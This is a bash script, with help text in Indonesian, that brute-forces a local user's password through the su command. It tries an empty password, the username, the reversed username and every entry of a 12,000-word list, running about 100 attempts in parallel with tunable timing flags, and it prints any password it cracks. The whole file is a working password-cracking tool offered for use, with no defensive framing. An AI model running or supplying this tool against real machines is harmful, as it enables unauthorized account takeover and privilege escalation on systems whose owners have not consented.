#!/bin/bash

help="Alat ini memaksa pengguna yang dipilih menggunakan su biner dan sebagai kata sandi: kata sandi nol, nama pengguna, nama pengguna terbalik, dan daftar kata (top12000.txt).
Anda dapat menentukan nama pengguna menggunakan -u <nama pengguna> dan daftar kata melalui -w <daftar kata>.
Secara default, kecepatan default BF menggunakan 100 proses su pada saat yang sama (setiap su percobaan berlangsung 0,7 detik dan su percobaan baru dalam 0,007 detik) ~ 143 detik hingga selesai
Anda dapat mengonfigurasi waktu ini menggunakan -t (batas waktu proses su) dan -s (tidur di antara 2 proses su).
Rekomendasi tercepat: -t 0,5 (minimun dapat diterima) dan -s 0,003 ~ 108 detik untuk diselesaikan

Example:    ./entod.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]

NAMA PENGGUNA SENSITIF HURUF BESAR DAN SKRIP INI TIDAK MEMERIKSA APAKAH NAMA PENGGUNA YANG DIBERIKAN ADA, HATI-HATI\n\n"

WORDLIST="top12000.txt"
USER=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
while getopts "h?u:t:s:w:" opt; do
  case "$opt" in
    h|\?) printf "$help"; exit 0;;
    u)  USER=$OPTARG;;
    t)  TIMEOUTPROC=$OPTARG;;
    s)  SLEEPPROC=$OPTARG;;
    w)  WORDLIST=$OPTARG;;
    esac
done

if ! [ "$USER" ]; then printf "$help"; exit 0; fi

if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi

C=$(printf '\033')

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  Password Di Temukan $USER Menggunakan kata sandi: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

su_brute_user_num (){
  echo "  [+] Sedang Di Entod $1..."
  USER=$1
  su_try_pwd $USER "" &    
  su_try_pwd $USER $USER & 
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     

  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
    while IFS='' read -r P || [ -n "${P}" ]; do 
      su_try_pwd $USER $P & 
      sleep $SLEEPPROC 
    done < $WORDLIST

  else
    cat - | while read line; do
      su_try_pwd $USER $line & 
      sleep $SLEEPPROC 
    done
  fi
  wait
}

su_brute_user_num $USER
echo "  Wordlist Password Tidak Ada" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
